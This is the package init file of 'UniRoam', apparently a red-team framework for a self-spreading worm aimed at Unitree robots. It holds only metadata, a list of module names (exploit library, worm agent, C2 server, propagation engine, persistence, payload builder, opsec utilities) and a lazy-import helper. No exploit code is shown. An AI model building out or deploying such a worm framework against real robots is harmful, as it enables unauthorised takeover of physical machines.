#!/usr/bin/env python3
"""
UniRoam - Autonomous Robot Worm Framework
Where UniPwn meets autonomous roaming

A comprehensive wormable attack framework for security research
and red team operations targeting Unitree robotic platforms.
"""

__version__ = "1.0.0"
__author__ = "UniRoam Development Team"
__license__ = "CC BY-NC-SA 4.0"

# Core modules - using lazy imports to avoid Windows asyncio issues
# when running as subprocess with redirected I/O
from . import config  # config is safe to import

__all__ = [
    'config',
    'exploit_lib',
    'worm_agent',
    'c2_server',
    'propagation_engine',
    'persistence',
    'payload_builder',
    'opsec_utils',
]

# Lazy import helper
def __getattr__(name):
    """Lazy import modules to avoid Windows asyncio subprocess issues"""
    if name in __all__:
        import importlib
        module = importlib.import_module(f'.{name}', __package__)
        globals()[name] = module
        return module
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")

